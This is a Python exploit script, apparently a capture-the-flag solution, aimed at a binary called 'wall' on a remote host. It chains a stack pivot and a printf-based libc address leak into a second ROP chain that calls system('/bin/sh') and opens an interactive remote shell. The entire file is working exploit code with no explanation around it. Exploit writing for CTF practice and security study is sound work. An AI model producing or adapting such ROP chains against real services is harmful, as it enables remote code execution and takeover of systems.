from ptrlib import *

binary = "./wall"
elf = ELF(binary)

r = None
libc = ELF("./libc.so.6")
r = Socket("nc 34.170.146.252 40015")
is_remote = True


def just_u64(x):
    return u64(x.ljust(8, b'\x00'))


def wait_for_attach():
    if not is_remote:
        input('attach?')

payload = [
    elf.symbol("message") + 0xf00,
    next(elf.gadget("ret;")),
    elf.plt("printf"),
    #next(elf.gadget("ret;")),
    #elf.symbol("main"),
    next(elf.gadget("ret;")),
    elf.symbol("get_name"),
    0x4011e2,
]

N = 24
payload = flat(payload, map=p64)
#payload += b"X" * (N - len(payload))
assert(is_scanf_safe(payload))
assert(b"\n" not in payload)

size = 128 // len(payload)

msg1_rop = [
    #next(elf.gadget("ret;")),
    elf.symbol("main")
]
msg = b"A" * (0xf00 - 128) + p64(elf.symbol("message") + 0xf00) + flat(msg1_rop, map=p64)
name = b"L" * 16 + payload * size
name += b"X" * (128 - len(name))
r.sendlineafter("Message:", msg)

r.sendlineafter("name?", name)
s = r.recvline()
print(s)
s = r.recvuntil("What").replace(b"What", b"")
print(s)
libc_addr = just_u64(s)

assert(libc_addr > 0x4011d6)
assert(libc_addr % 256 != 0xe0)
print(hex(libc_addr))
libc.base = libc_addr - 0x3a050 - 0x28000

r.sendlineafter("name?", str(1))

rop = [
    next(libc.gadget("ret")),
    next(libc.gadget("pop rdi; ret")),
    next(libc.find("/bin/sh")),
    libc.symbol("system")
]

print(', '.join(map(hex, rop)))

# 2nd
payload = flat(rop, map=p64)
msg = b"W" * 0xf08 + payload
r.sendlineafter("Message: ", msg)
wait_for_attach()
r.sendlineafter("name?", "hello")

r.interactive()